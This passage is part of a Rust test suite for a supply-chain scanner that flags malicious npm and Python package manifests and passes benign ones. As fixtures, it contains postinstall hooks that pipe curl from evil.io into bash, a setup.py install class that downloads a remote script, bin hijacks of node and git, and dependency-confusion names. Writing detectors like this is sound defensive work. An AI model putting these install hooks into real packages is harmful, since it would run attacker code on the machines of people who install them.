        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(has_rule(&findings, "SC_INSTALL_ENV_DUMP"));
    }

    // ── benign scripts — must NOT be flagged ──────────────────────────────────

    #[test]
    fn benign_tsc_not_flagged() {
        let pkg = json!({
            "name": "my-lib",
            "version": "1.0.0",
            "scripts": {
                "prepare": "tsc",
                "build": "tsc --project tsconfig.build.json"
            }
        });
        // `prepare` is a lifecycle hook; `build` is not — only `prepare` is checked.
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(
            findings.is_empty(),
            "benign tsc should not be flagged; got: {findings:?}"
        );
    }

    #[test]
    fn benign_node_build_js_not_flagged() {
        let pkg = json!({
            "name": "my-pkg",
            "version": "1.0.0",
            "scripts": {
                "prepare": "node build.js"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(
            findings.is_empty(),
            "benign node build.js should not be flagged; got: {findings:?}"
        );
    }

    #[test]
    fn benign_patch_package_not_flagged() {
        let pkg = json!({
            "name": "my-pkg",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "patch-package"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(
            findings.is_empty(),
            "patch-package should not be flagged; got: {findings:?}"
        );
    }

    #[test]
    fn benign_husky_install_not_flagged() {
        let pkg = json!({
            "name": "my-pkg",
            "version": "1.0.0",
            "scripts": {
                "prepare": "husky install"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(
            findings.is_empty(),
            "husky install should not be flagged; got: {findings:?}"
        );
    }

    #[test]
    fn benign_node_gyp_rebuild_not_flagged() {
        let pkg = json!({
            "name": "native-addon",
            "version": "1.0.0",
            "scripts": {
                "install": "node-gyp rebuild"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(
            findings.is_empty(),
            "node-gyp rebuild should not be flagged; got: {findings:?}"
        );
    }

    #[test]
    fn benign_prebuildify_not_flagged() {
        let pkg = json!({
            "name": "native-prebuilt",
            "version": "1.0.0",
            "scripts": {
                "install": "prebuildify --napi"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(
            findings.is_empty(),
            "prebuildify should not be flagged; got: {findings:?}"
        );
    }

    #[test]
    fn benign_prisma_generate_not_flagged() {
        let pkg = json!({
            "name": "my-app",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "prisma generate"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(
            findings.is_empty(),
            "prisma generate should not be flagged; got: {findings:?}"
        );
    }

    #[test]
    fn benign_echo_not_flagged() {
        let pkg = json!({
            "name": "my-pkg",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "echo 'Thank you for installing my-pkg!'"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(
            findings.is_empty(),
            "echo-only postinstall should not be flagged; got: {findings:?}"
        );
    }

    // ── bin hijack ────────────────────────────────────────────────────────────

    #[test]
    fn bin_hijack_node_flagged() {
        let pkg = json!({
            "name": "hijacker",
            "version": "1.0.0",
            "bin": {
                "node": "./cli.js"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(has_rule(&findings, "SC_BIN_HIJACK_KNOWN_CMD"));
    }

    #[test]
    fn bin_hijack_git_flagged() {
        let pkg = json!({
            "name": "evil-git",
            "version": "1.0.0",
            "bin": {
                "git": "./shim.js"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(has_rule(&findings, "SC_BIN_HIJACK_KNOWN_CMD"));
    }

    #[test]
    fn bin_custom_command_not_flagged() {
        let pkg = json!({
            "name": "my-cli",
            "version": "1.0.0",
            "bin": {
                "my-cli": "./bin/cli.js",
                "mc": "./bin/cli.js"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(!has_rule(&findings, "SC_BIN_HIJACK_KNOWN_CMD"));
    }

    // ── dependency confusion ──────────────────────────────────────────────────

    #[test]
    fn dep_confusion_scoped_package_name_flagged() {
        let pkg = json!({
            "name": "@internal/auth-service",
            "version": "1.0.0"
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(
            has_rule(&findings, "SC_DEP_CONFUSION_SCOPED_NAME"),
            "expected SC_DEP_CONFUSION_SCOPED_NAME, got: {findings:?}"
        );
    }

    #[test]
    fn dep_confusion_private_scope_name_flagged() {
        let pkg = json!({
            "name": "@private/payment-module",
            "version": "1.0.0"
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(has_rule(&findings, "SC_DEP_CONFUSION_SCOPED_NAME"));
    }

    #[test]
    fn dep_confusion_version_99_flagged() {
        let pkg = json!({
            "name": "innocent-looking",
            "version": "99.0.0"
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(has_rule(&findings, "SC_DEP_CONFUSION_VERSION"));
    }

    #[test]
    fn dep_confusion_version_0_0_0_flagged() {
        let pkg = json!({
            "name": "another-probe",
            "version": "0.0.0"
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(has_rule(&findings, "SC_DEP_CONFUSION_VERSION"));
    }

    #[test]
    fn dep_confusion_dep_scoped_flagged() {
        let pkg = json!({
            "name": "legit-app",
            "version": "1.0.0",
            "dependencies": {
                "@corp/payments": "^1.0.0"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(has_rule(&findings, "SC_DEP_CONFUSION_DEP_SCOPED"));
    }

    #[test]
    fn dep_confusion_dep_version_99_flagged() {
        let pkg = json!({
            "name": "legit-app",
            "version": "1.0.0",
            "dependencies": {
                "some-package": "99.0.0"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(has_rule(&findings, "SC_DEP_CONFUSION_DEP_VERSION"));
    }

    #[test]
    fn normal_scoped_public_pkg_not_flagged() {
        // @babel/core is a legitimate public scoped package
        let pkg = json!({
            "name": "@babel/core",
            "version": "7.22.0",
            "dependencies": {
                "lodash": "^4.17.21"
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(
            !has_rule(&findings, "SC_DEP_CONFUSION_SCOPED_NAME"),
            "well-known public scope should not be flagged; got: {findings:?}"
        );
    }

    #[test]
    fn normal_version_not_flagged() {
        let pkg = json!({
            "name": "my-package",
            "version": "1.2.3"
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(!has_rule(&findings, "SC_DEP_CONFUSION_VERSION"));
    }

    // ── files/main path escape ────────────────────────────────────────────────

    #[test]
    fn files_path_escape_flagged() {
        let pkg = json!({
            "name": "escape",
            "version": "1.0.0",
            "files": ["../secret/.env", "dist/"]
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(has_rule(&findings, "SC_FILES_PATH_ESCAPE"));
    }

    #[test]
    fn main_path_escape_flagged() {
        let pkg = json!({
            "name": "escape-main",
            "version": "1.0.0",
            "main": "../../../etc/passwd"
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(has_rule(&findings, "SC_MAIN_PATH_ESCAPE"));
    }

    #[test]
    fn normal_files_not_flagged() {
        let pkg = json!({
            "name": "normal",
            "version": "1.0.0",
            "main": "./dist/index.js",
            "files": ["dist/", "README.md", "LICENSE"]
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(!has_rule(&findings, "SC_FILES_PATH_ESCAPE"));
        assert!(!has_rule(&findings, "SC_MAIN_PATH_ESCAPE"));
    }

    // ── Python setup.py ───────────────────────────────────────────────────────

    #[test]
    fn python_setup_py_custom_install_flagged() {
        let code = r#"
from setuptools import setup
from setuptools.command.install import install
import subprocess

class CustomInstall(install):
    def run(self):
        subprocess.call(['curl', '-s', 'http://evil.io/s.sh', '-o', '/tmp/s.sh'])
        install.run(self)

setup(name='evil', cmdclass={'install': CustomInstall})
"#;
        let unit = FileUnit {
            rel_path: "setup.py".into(),
            data: code.as_bytes().to_vec(),
            kind: FileKind::Python,
            sha256: "0".repeat(64),
        };
        let config = ScanConfig::default();
        let ctx = ScanContext {
            target_name: "test".into(),
            files: &[unit],
            package_json: None,
            config: &config,
        };
        let engine = make_engine();
        let findings = engine.scan(&ctx);
        assert!(
            has_rule(&findings, "SC_PYTHON_SETUP_CUSTOM_INSTALL")
                || has_rule(&findings, "SC_INSTALL_CURL_PIPE_SHELL")
                || has_rule(&findings, "SC_INSTALL_NON_REGISTRY_URL"),
            "expected python install hook finding, got: {findings:?}"
        );
    }

    #[test]
    fn python_benign_setup_py_not_flagged() {
        let code = r#"
from setuptools import setup

setup(
    name='my-package',
    version='1.0.0',
    packages=['my_package'],
)
"#;
        let unit = FileUnit {
            rel_path: "setup.py".into(),
            data: code.as_bytes().to_vec(),
            kind: FileKind::Python,
            sha256: "0".repeat(64),
        };
        let config = ScanConfig::default();
        let ctx = ScanContext {
            target_name: "test".into(),
            files: &[unit],
            package_json: None,
            config: &config,
        };
        let engine = make_engine();
        let findings = engine.scan(&ctx);
        assert!(
            findings.is_empty(),
            "benign setup.py should not be flagged; got: {findings:?}"
        );
    }

    // ── engine name invariant ─────────────────────────────────────────────────

    #[test]
    fn engine_name_matches_finding_stamp() {
        let engine = make_engine();
        assert_eq!(engine.name(), "supply_chain");

        // All findings must stamp the same engine name.
        let pkg = json!({
            "name": "test",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "curl http://evil.io/x | bash"
            }
        });
        let findings = scan_pkg(&engine, &pkg);
        for f in &findings {
            assert_eq!(f.engine, "supply_chain", "finding engine mismatch: {f:?}");
        }
    }

    // ── evidence truncation ───────────────────────────────────────────────────

    #[test]
    fn evidence_truncated_to_160() {
        // A lifecycle hook body that is very long
        let long_url = format!("http://evil.io/{}", "x".repeat(300));
        let pkg = json!({
            "name": "long-evidence",
            "version": "1.0.0",
            "scripts": {
                "postinstall": format!("curl {} | bash", long_url)
            }
        });
        let findings = scan_pkg(&make_engine(), &pkg);
        for f in &findings {
            if let Some(ev) = &f.evidence {
                // with_evidence(..., 160) truncates at 160 char boundary + ellipsis
                assert!(
                    ev.len() <= 165,
                    "evidence too long ({} chars): {ev}",
                    ev.len()
                );
            }
        }
    }

    // ── no panic on malformed input ───────────────────────────────────────────

    #[test]
    fn handles_empty_package_json() {
        let pkg = json!({});
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(findings.is_empty());
    }

    #[test]
    fn handles_scripts_with_null_values() {
        let pkg = json!({
            "name": "null-scripts",
            "version": "1.0.0",
            "scripts": {
                "postinstall": null,
                "install": 42
            }
        });
        // Must not panic; null/non-string values are skipped.
        let findings = scan_pkg(&make_engine(), &pkg);
        let _ = findings; // result is irrelevant; test is about not panicking
    }

    #[test]
    fn handles_bin_as_string() {
        let pkg = json!({
            "name": "my-cli",
            "version": "1.0.0",
            "bin": "./cli.js"
        });
        // bin as string: command name is the package basename "my-cli" — not in hijack list.
        let findings = scan_pkg(&make_engine(), &pkg);
        assert!(!has_rule(&findings, "SC_BIN_HIJACK_KNOWN_CMD"));
    }

    #[test]
    fn handles_malformed_sub_package_json_gracefully() {
        // A file named like a sub-package.json but containing invalid JSON
        let unit = FileUnit {
            rel_path: "packages/foo/package.json".into(),
            data: b"{ not valid json !!".to_vec(),
            kind: FileKind::Manifest,
            sha256: "0".repeat(64),
        };
        let config = ScanConfig::default();
        let ctx = ScanContext {
            target_name: "test".into(),
            files: &[unit],
            package_json: None,
            config: &config,
        };
        let engine = make_engine();
        // Must not panic.
        let findings = engine.scan(&ctx);
        assert!(findings.is_empty());
    }
}
